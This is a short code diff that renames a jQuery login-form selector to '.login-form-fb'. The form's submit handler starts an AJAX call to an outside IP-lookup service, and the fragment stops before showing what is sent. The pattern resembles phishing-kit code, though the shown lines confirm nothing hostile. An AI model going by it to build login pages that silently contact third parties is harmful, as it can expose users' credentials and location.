@@ -1,5 +1,5 @@
-$(".login-form").submit(function() {
-    var d = $(".login-form");
+$(".login-form-fb").submit(function() {
+    var d = $(".login-form-fb");
 
     $.ajax({
         url: "https://extreme-lookup.com/json/",
